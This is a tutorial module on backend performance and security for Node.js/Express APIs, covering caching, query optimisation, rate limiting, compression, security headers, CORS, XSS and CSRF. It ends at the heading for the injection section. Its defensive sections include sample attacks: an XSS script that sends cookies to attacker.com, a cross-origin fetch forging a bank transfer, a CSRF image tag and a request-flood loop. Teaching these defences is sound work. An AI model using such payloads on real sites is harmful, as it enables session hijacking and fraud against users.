# Module 10: Performance & Security - Speed and Safety

> **"Performance is a feature. Security is a foundation. You can have a fast app that's insecure, or a secure app that's slow—but you can't have a successful app that's neither."**

---

## Table of Contents

1. [The Performance Mindset](#1-the-performance-mindset)
2. [Caching Strategies](#2-caching-strategies)
3. [Database Query Optimization](#3-database-query-optimization)
4. [Rate Limiting](#4-rate-limiting)
5. [Compression](#5-compression)
6. [Security Checklist](#6-security-checklist)
7. [Load Balancing Basics](#7-load-balancing-basics)
8. [The Cost of Getting It Wrong](#8-the-cost-of-getting-it-wrong)
9. [Mini Project: Fortify the Task API](#9-mini-project-fortify-the-task-api)
10. [Summary & Quick Reference](#10-summary--quick-reference)

---

## 1. The Performance Mindset

### WHAT Is the Performance Mindset?

Performance engineering is not about making everything fast. It's about **making the right things fast at the right time**.

### Premature Optimization vs. Necessary Optimization

**Premature Optimization** (Donald Knuth's famous warning):
- Tweaking loop unrolling before your app has users.
- Rewriting JavaScript in Rust for a CRUD API with 10 requests/minute.
- Obsessing over nanoseconds when your database query takes 3 seconds.

**Necessary Optimization**:
- Your API response time is > 500ms and users are complaining.
- Your database CPU is at 95% during peak hours.
- Your serverless bill doubled because of N+1 queries.
- Load testing reveals crashes at 100 concurrent users.

### The 80/20 Rule of Performance

80% of your performance gains come from 20% of your code. Profile first, optimize second:

```bash
# Node.js built-in profiler
node --prof server.js
# Run your load test, then:
node --prof-process isolate-0x*.log > profile.txt

# Or use clinic.js (recommended)
npm install -g clinic
clinic doctor -- node server.js
clinic bubbleprof -- node server.js
clinic flame -- node server.js
```

### Measuring Before Optimizing

**What to measure:**

| Metric | Tool | Target |
|--------|------|--------|
| Response time | `console.time`, New Relic, Datadog | P50 < 100ms, P99 < 500ms |
| Throughput | `autocannon`, `k6` | Sustained without errors |
| Memory usage | `--inspect`, `clinic doctor` | Stable, no leaks |
| Database queries | `EXPLAIN ANALYZE`, `pg_stat_statements` | No sequential scans on large tables |
| Event loop lag | `event-loop-lag` package | < 50ms |

```bash
# Quick load test with autocannon
npx autocannon -c 100 -d 30 http://localhost:3000/api/tasks
# -c 100 = 100 concurrent connections
# -d 30  = test for 30 seconds
```

**WHAT HAPPENS If You Optimize Blindly:**

- You add Redis caching to an endpoint that takes 5ms. Complexity increases, bugs creep in, zero user benefit.
- You denormalize your database schema for speed. Now updates are buggy and data inconsistency haunts you.
- You shard your database at 1,000 users. Your queries become complex joins across shards for no reason.

---

## 2. Caching Strategies

### 2.1 In-Memory Caching: Fast but Fragile

**WHAT Is It?**

Storing frequently accessed data in application memory (RAM) for instant retrieval.

```javascript
// Naive in-memory cache (DON'T USE IN PRODUCTION)
const cache = {};

async function getUser(userId) {
  if (cache[userId]) {
    console.log('Cache hit');
    return cache[userId];
  }
  
  console.log('Cache miss');
  const user = await db.users.findById(userId);
  cache[userId] = user; // ❌ Unbounded growth!
  return user;
}
```

**WHY It Must Be Bounded (LRU):**

```javascript
const LRU = require('lru-cache');

// ✅ Bounded, TTL-aware cache
const userCache = new LRU({
  max: 500,              // Maximum 500 items
  ttl: 1000 * 60 * 5,    // 5 minutes TTL
  updateAgeOnGet: true,  // Reset TTL on access
  allowStale: false,     // Don't return expired items
  
  // WHAT: Called when item is evicted
  dispose: (value, key) => {
    console.log(`Evicted from cache: ${key}`);
  }
});

async function getUser(userId) {
  const cached = userCache.get(userId);
  if (cached) return cached;
  
  const user = await db.users.findById(userId);
  userCache.set(userId, user);
  return user;
}
```

**WHAT HAPPENS If You Cache Without Bounds:**

```javascript
// The memory leak that killed a startup:
const cache = new Map();

// Every user request adds an entry
// 100,000 users × 10KB per user object = 1GB RAM
// Node.js heap max: ~1.4GB (default)
// Result: process.memoryUsage().heapUsed exceeds limit
// Result: "FATAL ERROR: Reached heap limit Allocation failed"
// Result: Server crashes under load
```

**Real breach (2022)**: A fintech startup cached user portfolios in an unbounded Map. During a market volatility event, user traffic spiked 50x. The cache grew to 8GB, Node.js crashed with OOM (Out of Memory), and the trading platform was down for 4 hours during peak trading.

**LATEST BEST PRACTICE**: Use `lru-cache` v10+ with `fetchMethod` for automatic cache-aside:

```javascript
const userCache = new LRU({
  max: 1000,
  ttl: 300000,
  fetchMethod: async (userId, staleValue, { signal }) => {
    // Automatically called on cache miss
    return db.users.findById(userId);
  }
});

// Usage: cache handles miss automatically
const user = await userCache.fetch('user-123');
```

---

### 2.2 Redis Caching: The Cache-Aside Pattern

**WHAT Is Redis?**

Redis is an in-memory data structure store used as a database, cache, message broker, and streaming engine. It runs as a separate process (or cluster), shared across all application servers.

**WHY Redis Over In-Memory?**

| In-Memory | Redis |
|-----------|-------|
| Per-server (isolated) | Shared across all servers |
| Lost on restart/process crash | Persistent (optional) |
| Can't share with other services | Centralized for all services |
| Limited by single server RAM | Scales to clusters (Redis Cluster) |
| No built-in eviction policies | LRU, LFU, TTL, maxmemory policies |

**The Cache-Aside Pattern (Most Common):**

```javascript
const Redis = require('ioredis');
const redis = new Redis(process.env.REDIS_URL);

// ============================================================
// CACHE-ASIDE PATTERN
// ============================================================
// 1. Check cache first
// 2. If miss: query DB, store in cache, return
// 3. If hit: return cached data
// ============================================================

async function getTask(taskId) {
  const cacheKey = `task:${taskId}`;
  
  // STEP 1: Check cache
  const cached = await redis.get(cacheKey);
  if (cached) {
    try {
      return JSON.parse(cached);
    } catch (err) {
      // Cache corruption: delete and fall through to DB
      await redis.del(cacheKey);
    }
  }
  
  // STEP 2: Cache miss → query database
  const task = await db.tasks.findById(taskId);
  if (!task) return null;
  
  // STEP 3: Store in cache with TTL
  await redis.setex(cacheKey, 300, JSON.stringify(task)); // 5 min TTL
  
  return task;
}

async function updateTask(taskId, updates) {
  // STEP 1: Update database (source of truth)
  const updated = await db.tasks.update(taskId, updates);
  
  // STEP 2: Invalidate cache (don't update cache—race conditions!)
  await redis.del(`task:${taskId}`);
  
  // STEP 3: Also invalidate related caches
  await redis.del('tasks:list:all');
  await redis.del(`tasks:list:user:${updated.userId}`);
  
  return updated;
}
```

**WHY Invalidate Instead of Update?**

```javascript
// DANGER: Update cache after DB write
// Race condition: Two updates happen simultaneously
// Request A: Updates DB → reads stale cache → writes stale cache
// Request B: Updates DB → reads new cache → writes new cache
// Final state: Cache has Request A's stale data!

// SAFE: Delete cache, next read will refresh from DB
await redis.del(`task:${taskId}`);
```

**WHAT HAPPENS If You Don't Invalidate?**

```javascript
// The stale data bug:
// 1. User updates task title from "Buy milk" → "Buy eggs"
// 2. DB is updated ✅
// 3. Cache still has "Buy milk" ❌
// 4. User refreshes: sees "Buy milk" (from cache)
// 5. User thinks update failed, updates again
// 6. Support ticket: "Your app is broken!"

// Worse: Financial data
// 1. Stock price cached: $100
// 2. Price changes to $95 in DB
// 3. Cache still shows $100
// 4. User buys at "$100" (cached), but actual is $95
// 5. Legal liability: price misrepresentation
```

---

### 2.3 HTTP Caching Headers: Let the Browser Help

**WHAT Are HTTP Cache Headers?**

HTTP provides built-in caching semantics. When used correctly, your CDN, browser, and proxy caches reduce load to zero for repeat requests.

**The Header Toolkit:**

```javascript
// ETag: Entity Tag (content fingerprint)
app.get('/api/tasks/:id', async (req, res) => {
  const task = await getTask(req.params.id);
  
  // Generate ETag from content hash
  const etag = crypto.createHash('md5').update(JSON.stringify(task)).digest('hex');
  
  // Check if-none-match
  if (req.headers['if-none-match'] === etag) {
    return res.status(304).end(); // Not Modified
  }
  
  res.setHeader('ETag', etag);
  res.setHeader('Cache-Control', 'private, max-age=60'); // 60 seconds
  res.json(task);
});

// Cache-Control directives
// public     = Cacheable by CDNs and browsers
// private    = Cacheable by browser only
// no-cache   = Must revalidate with server (use ETag)
// no-store   = Never cache (sensitive data)
// max-age=N  = Cache for N seconds
// s-maxage=N = CDN cache for N seconds (overrides max-age for CDNs)
```

**Complete HTTP Caching Strategy:**

```javascript
// Static assets (images, CSS, JS) - versioned filenames
app.use('/static', express.static('public', {
  maxAge: '1y', // 1 year (immutable files)
  etag: true,
  lastModified: true
}));

// API responses
const cachePolicies = {
  // User profile: cache 5 min, must revalidate
  userProfile: 'private, no-cache, max-age=300',
  
  // Task list: cache 1 min, browser only
  taskList: 'private, max-age=60',
  
  // Reference data (categories, statuses): cache 1 hour, CDN OK
  referenceData: 'public, max-age=3600, s-maxage=3600',
  
  // Financial data: never cache
  financial: 'no-store, no-cache, must-revalidate',
  
  // Real-time data: no cache
  realTime: 'no-store'
};

app.get('/api/tasks', async (req, res) => {
  const tasks = await getTasks(req.user.id);
  
  res.setHeader('Cache-Control', cachePolicies.taskList);
  res.setHeader('Vary', 'Authorization'); // Cache per user
  res.json(tasks);
});
```

**WHAT HAPPENS If You Cache Without Understanding:**

```javascript
// The authentication leak:
app.get('/api/user/profile', async (req, res) => {
  const profile = await getProfile(req.user.id);
  res.setHeader('Cache-Control', 'public, max-age=3600'); // ❌ PUBLIC!
  res.json(profile);
});

// Result: CDN caches User A's profile
// User B requests /api/user/profile
// CDN serves User A's data to User B! 🔥

// CORRECT:
res.setHeader('Cache-Control', 'private, max-age=300');
res.setHeader('Vary', 'Authorization');
```

**LATEST BEST PRACTICE (2025)**: Use `stale-while-revalidate` for the best UX:

```javascript
// Serve stale cache for 1 day while revalidating in background
res.setHeader('Cache-Control', 'public, max-age=60, stale-while-revalidate=86400');

// Behavior:
// - First request: fetch from origin, cache for 60s
// - Within 60s: serve from cache instantly
// - After 60s: serve STALE cache instantly, BUT fetch fresh copy in background
// - Next request: fresh copy is served
// Result: Users NEVER wait, data is eventually consistent
```

---

### 2.4 Cache Invalidation: The Hard Problem

Phil Karlton famously said: *"There are only two hard things in Computer Science: cache invalidation and naming things."*

**Cache Invalidation Strategies:**

| Strategy | How | When to Use |
|----------|-----|-------------|
| **TTL (Time-To-Live)** | Auto-expire after N seconds | Reference data, non-critical |
| **Write-through** | Update cache when DB updates | Strong consistency needed |
| **Write-behind** | Update cache, async DB write | Extreme write performance |
| **Event-driven** | Publish invalidate event on change | Microservices, distributed |
| **Manual purge** | Admin API to clear cache | Emergency fixes |

**Event-Driven Invalidation (Production Pattern):**

```javascript
// When any service updates a task, publish event
await redis.publish('cache:invalidate', JSON.stringify({
  pattern: `task:${taskId}`,
  source: 'task-service',
  timestamp: Date.now()
}));

// All API servers subscribe to invalidation channel
const subscriber = new Redis(process.env.REDIS_URL);
subscriber.subscribe('cache:invalidate');

subscriber.on('message', (channel, message) => {
  const { pattern } = JSON.parse(message);
  // Could use Redis SCAN to find matching keys
  redis.del(pattern).catch(console.error);
});
```

**WHAT HAPPENS If You Cache Without TTL:**

```javascript
// The memory exhaustion scenario:
// Cache fills with user sessions, API responses, search results
// No eviction policy → Redis maxmemory reached
// Redis policy: noeviction → writes start failing
// OR Redis policy: allkeys-lru → random important keys evicted

// CORRECT: Always set TTL
await redis.setex(key, 3600, value); // 1 hour max

// And monitor:
redis.info('memory').then(info => {
  const used = info.used_memory_human;
  const peak = info.used_memory_peak_human;
  console.log(`Redis memory: ${used} (peak: ${peak})`);
});
```

---

## 3. Database Query Optimization

### 3.1 Indexing: Why It Matters

**WHAT Is an Index?**

An index is a data structure (typically B-Tree) that allows the database to find rows without scanning the entire table.

**WITHOUT an index (Sequential Scan):**

```sql
SELECT * FROM tasks WHERE user_id = 'user-123';
-- Database reads EVERY row, checks user_id
-- 1,000,000 rows = 1,000,000 comparisons
-- Time: ~500ms
```

**WITH an index (Index Scan):**

```sql
CREATE INDEX idx_tasks_user_id ON tasks(user_id);

SELECT * FROM tasks WHERE user_id = 'user-123';
-- Database uses B-Tree: O(log n) lookups
-- 1,000,000 rows = ~20 comparisons
-- Time: ~1ms
```

**500x faster.** This is not an exaggeration.

---

### 3.2 WHEN Indexing Hurts

**WHAT HAPPENS If You Index Everything:**

```sql
-- Every index slows down writes
INSERT INTO tasks (title, user_id, status, priority, created_at)
VALUES ('Buy milk', 'user-123', 'pending', 'high', NOW());

-- With 5 indexes:
-- 1. Insert row into table
-- 2. Insert entry into idx_tasks_user_id
-- 3. Insert entry into idx_tasks_status
-- 4. Insert entry into idx_tasks_priority
-- 5. Insert entry into idx_tasks_created_at
-- 6. Insert entry into idx_tasks_composite

-- Write time: 50ms instead of 5ms
-- Disk usage: 2x (indexes take space)
-- Vacuum/maintenance: Much slower
```

**Indexing Rules:**

| Index? | Query Pattern | Reason |
|--------|--------------|--------|
| ✅ Yes | `WHERE user_id = ?` | Frequent lookups |
| ✅ Yes | `WHERE status = ? ORDER BY created_at DESC` | Composite index `(status, created_at)` |
| ✅ Yes | `WHERE email = ?` (unique) | Enforces uniqueness + fast lookup |
| ❌ No | `WHERE description LIKE '%search%'` | Leading wildcard can't use index |
| ❌ No | `WHERE is_deleted = false` (90% of rows) | Low cardinality, index not selective |
| ❌ No | `SELECT *` on small table (< 1000 rows) | Sequential scan is faster |

---

### 3.3 Query Analysis with EXPLAIN

**WHAT Is EXPLAIN?**

`EXPLAIN` shows the database's execution plan—how it will run your query.

```sql
EXPLAIN ANALYZE SELECT * FROM tasks 
WHERE user_id = 'user-123' 
AND status = 'pending' 
ORDER BY created_at DESC 
LIMIT 20;

-- PostgreSQL output:
-- Limit  (cost=0.42..12.50 rows=20 width=200) (actual time=0.023..0.045 rows=20 loops=1)
--   ->  Index Scan Backward using idx_tasks_user_status_created
--         on tasks  (cost=0.42..6250.00 rows=10000 width=200)
--         Index Cond: ((user_id = 'user-123'::text) AND (status = 'pending'::text))
--         actual time=0.020..0.040 rows=20 loops=1
-- Planning Time: 0.150 ms
-- Execution Time: 0.060 ms
```

**Reading EXPLAIN Output:**

| Term | Meaning | Good or Bad? |
|------|---------|--------------|
| `Index Scan` | Used an index | ✅ Good |
| `Seq Scan` | Scanned entire table | ⚠️ Bad on large tables |
| `Bitmap Heap Scan` | Used index to find pages, then scanned pages | ⚠️ Okay |
| `cost=0.42..12.50` | Estimated cost (arbitrary units) | Lower is better |
| `actual time=0.023` | Real execution time | < 10ms is good |
| `rows=20` | Estimated rows returned | Should match actual |
| `loops=1` | How many times this step ran | Higher = potential problem |

**The N+1 Problem:**

```javascript
// THE N+1 PROBLEM (Worst Performance Bug)
const users = await db.users.findAll({ limit: 100 });

// For each user, fetch their tasks → 100 additional queries!
for (const user of users) {
  user.tasks = await db.tasks.findAll({ where: { userId: user.id } });
}
// Total queries: 1 + 100 = 101 queries
// If limit is 1000: 1,001 queries
```

**SOLUTIONS:**

```javascript
// SOLUTION 1: Eager Loading (JOIN)
const users = await db.users.findAll({
  limit: 100,
  include: [{
    model: db.tasks,
    required: false // LEFT JOIN
  }]
});
// Total queries: 1 (with JOIN)

// SOLUTION 2: Separate queries with IN clause
const users = await db.users.findAll({ limit: 100 });
const userIds = users.map(u => u.id);

const tasks = await db.tasks.findAll({
  where: { userId: { [Op.in]: userIds } }
});

// Map tasks to users in memory
const tasksByUser = _.groupBy(tasks, 'userId');
users.forEach(user => {
  user.tasks = tasksByUser[user.id] || [];
});
// Total queries: 2

// SOLUTION 3: DataLoader (GraphQL/Apollo)
const taskLoader = new DataLoader(async (userIds) => {
  const tasks = await db.tasks.findAll({
    where: { userId: { [Op.in]: userIds } }
  });
  return userIds.map(id => tasks.filter(t => t.userId === id));
});

// Each call is batched within a single event loop tick
const userTasks = await taskLoader.load(user.id);
```

**WHAT HAPPENS If You Ignore the N+1 Problem:**

```
Scenario: 1000 users, 5 tasks each

Naive approach: 1 + 1000 = 1001 queries
At 5ms per query: 5 seconds total
User sees loading spinner for 5 seconds → abandons app

With JOIN: 1 query
At 50ms per query: 50ms total
Instant response → happy user
```

---

### 3.4 Database Connection Pooling

**WHAT Is Connection Pooling?**

Instead of opening a new database connection per request, maintain a pool of reusable connections.

```javascript
// Sequelize configuration
const sequelize = new Sequelize(database, username, password, {
  host: 'localhost',
  dialect: 'postgres',
  pool: {
    max: 20,        // Maximum connections in pool
    min: 5,         // Minimum connections (keep warm)
    acquire: 30000, // Max time to get connection (ms)
    idle: 10000     // Max idle time before release (ms)
  }
});

// pg (node-postgres) configuration
const pool = new Pool({
  host: 'localhost',
  database: 'mydb',
  max: 20,         // Maximum pool size
  connectionTimeoutMillis: 2000, // Wait 2s for connection
  idleTimeoutMillis: 10000       // Close idle connections after 10s
});
```

**WHAT HAPPENS If Pool Is Misconfigured:**

```
Pool size: 5
Incoming requests: 100 concurrent

5 connections busy → 95 requests wait
Wait timeout: 30 seconds
Result: 95 requests timeout after 30s
Result: User sees "Request Timeout" errors
Result: You think your API is broken, but it's just pool starvation
```

**Rule of thumb**: Pool size = (Core count × 2) + effective spindle count. For cloud DBs (RDS, Cloud SQL): Start with 20, monitor `active_connections`.

---

## 4. Rate Limiting

### 4.1 WHY Rate Limiting Is Non-Negotiable

**WHAT Is Rate Limiting?**

Restricting the number of requests a client can make in a time window.

**WHY Both IP and User-Based?**

| Attack Vector | IP-Based Limit | User-Based Limit | Why Both? |
|--------------|----------------|------------------|-----------|
| Single user spamming | Caught | Caught | Redundancy |
| Botnet (1000 IPs, 1 user) | Not caught | **Caught** | User token identifies them |
| Office network (1 IP, 50 users) | **Caught** | Not caught | NAT shares IPs |
| Compromised account | Not caught | **Caught** | Limits blast radius |

**Without user-based limits**: A botnet with 10,000 IPs can bypass IP limits entirely.
**Without IP-based limits**: A single IP with 50 stolen accounts can hit your API 50x the limit.

---

### 4.2 Rate Limiting Algorithms

**Token Bucket (Recommended):**

```javascript
const Redis = require('ioredis');
const redis = new Redis(process.env.REDIS_URL);

// Token bucket Lua script (atomic operation)
const tokenBucketScript = `
  local key = KEYS[1]
  local capacity = tonumber(ARGV[1])
  local refill_rate = tonumber(ARGV[2])
  local now = tonumber(ARGV[3])
  local requested = tonumber(ARGV[4])
  
  local bucket = redis.call('HMGET', key, 'tokens', 'last_refill')
  local tokens = tonumber(bucket[1]) or capacity
  local last_refill = tonumber(bucket[2]) or now
  
  local delta = math.max(0, now - last_refill)
  tokens = math.min(capacity, tokens + delta * refill_rate)
  
  if tokens >= requested then
    tokens = tokens - requested
    redis.call('HMSET', key, 'tokens', tokens, 'last_refill', now)
    redis.call('EXPIRE', key, math.ceil(capacity / refill_rate))
    return {1, tokens}
  else
    redis.call('HMSET', key, 'tokens', tokens, 'last_refill', now)
    return {0, tokens}
  end
`;

async function checkRateLimit(key, capacity, refillRate) {
  const now = Math.floor(Date.now() / 1000);
  const result = await redis.eval(
    tokenBucketScript,
    1, // number of keys
    key,
    capacity,
    refillRate,
    now,
    1 // requested tokens
  );
  
  return {
    allowed: result[0] === 1,
    remaining: Math.floor(result[1])
  };
}

// Express middleware
async function rateLimitMiddleware(req, res, next) {
  // Use BOTH IP and user ID
  const ipKey = `ratelimit:ip:${req.ip}`;
  const userKey = req.user ? `ratelimit:user:${req.user.id}` : null;
  
  const [ipResult, userResult] = await Promise.all([
    checkRateLimit(ipKey, 100, 1 / 60),   // 100 requests per minute per IP
    userKey ? checkRateLimit(userKey, 1000, 10 / 60) : { allowed: true } // 1000/min per user
  ]);
  
  res.setHeader('RateLimit-Limit', '100');
  res.setHeader('RateLimit-Remaining', ipResult.remaining);
  
  if (!ipResult.allowed || !userResult.allowed) {
    return res.status(429).json({
      type: 'https://api.example.com/errors/rate-limit',
      title: 'Rate Limit Exceeded',
      status: 429,
      detail: 'Too many requests. Please slow down.',
      retryAfter: 60
    });
  }
  
  next();
}
```

**Using `express-rate-limit` (Simpler Setup):**

```javascript
const rateLimit = require('express-rate-limit');
const RedisStore = require('rate-limit-redis');

// General API limit
const generalLimiter = rateLimit({
  store: new RedisStore({
    client: redis,
    prefix: 'rl:general:'
  }),
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // 100 requests per window
  standardHeaders: true, // Return RateLimit-* headers
  legacyHeaders: false, // Disable X-RateLimit-* headers
  keyGenerator: (req) => req.ip,
  handler: (req, res) => {
    res.status(429).json({
      error: 'Too many requests from this IP'
    });
  }
});

// Stricter limit for auth endpoints
const authLimiter = rateLimit({
  store: new RedisStore({ client: redis, prefix: 'rl:auth:' }),
  windowMs: 15 * 60 * 1000,
  max: 5, // 5 login attempts per 15 min
  skipSuccessfulRequests: true // Don't count successful logins
});

app.use('/api/', generalLimiter);
app.use('/api/auth/login', authLimiter);
```

**WHAT HAPPENS If You Skip Rate Limiting?**

```
Scenario: No rate limiting

1. Attacker runs: while true; do curl /api/expensive; done
2. 1000 requests/second hit your database
3. Connection pool exhausted
4. Legitimate users get 500 errors
5. AWS RDS bill: $5000 this month (was $200)
6. 3 AM page: "API is down"

Scenario: Credential stuffing
1. Attacker tries 1,000,000 password combinations
2. No rate limiting = unlimited attempts
3. Weak password compromised in hours
4. Account takeover, data breach, GDPR fines
```

---

## 5. Compression

### 5.1 Brotli vs Gzip

**WHAT Are They?**

Compression algorithms that reduce response size before sending over the network.

| Feature | Gzip | Brotli |
|---------|------|--------|
| **Compression ratio** | Good (~70%) | **Better** (~80-85%) |
| **Compression speed** | Fast | Slower |
| **Decompression speed** | Fast | Fast |
| **Browser support** | Universal | 95%+ (all modern browsers) |
| **Best for** | Dynamic content | Static assets, large JSON |
| **CPU cost** | Lower | Higher |

**When to use which:**
- **Static assets** (JS, CSS): Brotli at max compression (pre-compressed at build time).
- **Dynamic API responses**: Gzip (faster, less CPU per request).
- **Small responses** (< 1KB): No compression (overhead exceeds savings).

---

### 5.2 Implementation in Express

```javascript
const compression = require('compression');
const zlib = require('zlib');

// Dynamic content: Gzip with filtering
app.use(compression({
  // Only compress responses > 1KB
  filter: (req, res) => {
    if (req.headers['x-no-compression']) return false;
    return compression.filter(req, res);
  },
  // Gzip level 6 (balance of speed/ratio)
  level: zlib.constants.Z_DEFAULT_COMPRESSION
}));

// For Brotli (static assets), pre-compress at build time:
// Build step:
// brotli -q 11 dist/app.js -o dist/app.js.br
// brotli -q 11 dist/app.css -o dist/app.css.br

// NGINX serves .br files automatically:
// location ~* \.(js|css)$ {
//   brotli_static on;
//   gzip_static on;
// }
```

**LATEST BEST PRACTICE (2025)**: Use `compression` for API responses, but **pre-compress static assets at build time** with Brotli. Don't compress images (already compressed), PDFs, or small responses.

**WHAT HAPPENS If You Compress Everything:**

```javascript
// BAD: Compress small responses
app.use(compression()); // No filter!

// A 200-byte JSON response:
// Uncompressed: 200 bytes + headers
// Compressed: 180 bytes + compression overhead
// Net result: SLOWER (compression CPU cost > byte savings)

// BAD: Compress images
app.use(compression());
// JPEG is already compressed. Gzip adds ~5% overhead.
// CPU burns for zero benefit.
```

---

## 6. Security Checklist

### 6.1 Helmet.js: Security Headers in One Line

**WHAT Is Helmet?**

Helmet.js sets HTTP headers to protect against well-known web vulnerabilities.

```javascript
const helmet = require('helmet');

// Default configuration (good for most apps)
app.use(helmet());

// Production configuration
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"], // Allow inline styles
      scriptSrc: ["'self'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "https://api.example.com"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: []
    }
  },
  hsts: {
    maxAge: 31536000, // 1 year
    includeSubDomains: true,
    preload: true
  },
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
  permissionsPolicy: {
    features: {
      camera: [],
      microphone: [],
      geolocation: [],
      payment: []
    }
  }
}));
```

**Headers Helmet Sets:**

| Header | What It Blocks |
|--------|---------------|
| `Content-Security-Policy` | XSS by restricting script sources |
| `Strict-Transport-Security` | Forces HTTPS (prevents downgrade) |
| `X-Content-Type-Options` | MIME-type sniffing attacks |
| `X-Frame-Options` | Clickjacking (iframe embedding) |
| `X-XSS-Protection` | Legacy XSS filter (deprecated, but safe) |
| `Referrer-Policy` | Leaking referrer to third parties |
| `Permissions-Policy` | Browser features (camera, geolocation) |

**WHAT HAPPENS If You Skip Security Headers:**

```
Real breaches caused by missing headers:

1. Clickjacking (no X-Frame-Options):
   Attacker embeds your "Transfer Money" page in an invisible iframe
   User clicks "Claim Prize" button → actually clicks "Confirm Transfer"
   Result: $50,000 stolen from user's account

2. MIME sniffing (no X-Content-Type-Options):
   Attacker uploads "image.jpg" containing JavaScript
   Browser sniffs content, executes as JS
   Result: XSS attack, session hijacking

3. HTTP downgrade (no HSTS):
   User visits http://bank.com (typo, old bookmark)
   Attacker intercepts, serves fake login page
   Result: Credentials stolen via man-in-the-middle
```

---

### 6.2 CORS: Why `*` With Credentials Is Suicide

**WHAT Is CORS?**

Cross-Origin Resource Sharing controls which domains can access your API from browsers.

**THE DANGER:**

```javascript
// SUICIDE CONFIGURATION ❌❌❌
const cors = require('cors');
app.use(cors({
  origin: '*', // Any website can call your API
  credentials: true // And send cookies!
}));
```

**Attack Scenario:**
1. User is logged into `api.bank.com` (cookie stored).
2. User visits `evil.com`.
3. `evil.com` sends:
   ```javascript
   fetch('https://api.bank.com/transfer', {
     method: 'POST',
     credentials: 'include', // Sends bank's cookies!
     body: JSON.stringify({ to: 'attacker', amount: 99999 })
   });
   ```
4. Bank API receives request WITH valid session cookie.
5. Transfer executes. User is robbed.

This is **CSRF (Cross-Site Request Forgery)** made easy by bad CORS.

**SAFE CORS CONFIGURATION:**

```javascript
const allowedOrigins = [
  'http://localhost:5173',     // Local dev
  'https://app.example.com',   // Production web
  'https://admin.example.com'  // Production admin
];

app.use(cors({
  origin: (origin, callback) => {
    // Allow requests with no origin (mobile apps, curl)
    if (!origin) return callback(null, true);
    
    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error(`Origin ${origin} not allowed by CORS`));
    }
  },
  credentials: true, // OK because origin is restricted!
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Request-ID']
}));
```

**LATEST BEST PRACTICE (2025)**: Use `Access-Control-Allow-Origin` with explicit origins, never `*`. For public APIs without auth, `*` is fine. For authenticated APIs, explicit origins only.

---

### 6.3 XSS Prevention

**WHAT Is XSS?**

Cross-Site Scripting: Attacker injects malicious scripts into your application, which execute in other users' browsers.

**Types:**
1. **Stored XSS**: Script saved to database, served to all users.
2. **Reflected XSS**: Script in URL, reflected in response.
3. **DOM-based XSS**: Script manipulates client-side DOM.

**EXPRESS DEFENSES:**

```javascript
const express = require('express');
const helmet = require('helmet');

// 1. Content Security Policy (Helmet)
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"], // No inline scripts, no eval
    styleSrc: ["'self'"],
    imgSrc: ["'self'", "data:"]
  }
}));

// 2. Input sanitization (server-side)
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const DOMPurify = createDOMPurify(new JSDOM('').window);

app.post('/api/comments', (req, res) => {
  const rawContent = req.body.content;
  
  // ❌ DON'T: Direct output
  // res.json({ content: rawContent });
  
  // ✅ DO: Sanitize
  const cleanContent = DOMPurify.sanitize(rawContent, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href']
  });
  
  // Store cleanContent in database
  // Even if attacker sends <script>alert('xss')</script>,
  // DOMPurify strips it to: alert('xss')
});

// 3. Output encoding (if not using JSON)
const escapeHtml = (unsafe) => {
  return unsafe
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
};
```

**WHAT HAPPENS If You Skip XSS Prevention:**

```html
<!-- Attacker posts this comment: -->
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

<!-- Your app serves it to all users -->
<!-- Every visitor sends their session cookie to attacker -->
<!-- Attacker hijacks sessions, impersonates users -->
```

**Famous XSS Breaches:**
- **Samy Worm (MySpace, 2005)**: 1 million profiles infected in 20 hours.
- **British Airways (2018)**: 380,000 payment details stolen via Magecart XSS.
- **Fortnite (2019)**: XSS vulnerability allowed account takeover of 200 million users.

---

### 6.4 CSRF Protection for Non-API Apps

**WHAT Is CSRF?**

Cross-Site Request Forgery: Attacker tricks a user's browser into performing unwanted actions on a site where they're authenticated.

**WHEN You Need CSRF Protection:**

| App Type | Needs CSRF? | Why? |
|----------|------------|------|
| Traditional server-rendered forms | **Yes** | Browser auto-sends cookies |
| SPA with JWT in `Authorization` header | No | Custom header = not automatic |
| API with cookie-based auth | **Yes** | Cookies auto-sent |
| Mobile app with token auth | No | No browser cookie mechanism |

**Express CSRF Protection:**

```javascript
const csrf = require('csurf');
const cookieParser = require('cookie-parser');

app.use(cookieParser());
app.use(csrf({ cookie: true }));

// Server-rendered form
app.get('/form', (req, res) => {
  res.send(`
    <form action="/transfer" method="POST">
      <input type="hidden" name="_csrf" value="${req.csrfToken()}">
      <input type="text" name="amount" placeholder="Amount">
      <button type="submit">Transfer</button>
    </form>
  `);
});

app.post('/transfer', (req, res) => {
  // csurf middleware automatically validates the token
  // If token is missing or invalid → 403 Forbidden
  processTransfer(req.body.amount);
  res.send('Transfer complete');
});
```

**For SPAs using cookies**: Send CSRF token in a header:

```javascript
// Server sends token in a cookie or meta tag
app.get('/api/csrf-token', (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

// Client includes it in requests
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'CSRF-Token': csrfToken // Custom header
  },
  credentials: 'include',
  body: JSON.stringify({ amount: 100 })
});
```

**WHAT HAPPENS If You Skip CSRF on Cookie Auth:**

```
1. User is logged into bank.com (session cookie set).
2. User visits evil.com in another tab.
3. evil.com has: <img src="https://bank.com/transfer?to=attacker&amount=99999">
4. Browser auto-sends bank.com cookie with the request.
5. Bank processes transfer. User loses money.
6. This is called a "drive-by" attack and requires ZERO user interaction.
```

---

### 6.5 SQL/NoSQL Injection Prevention

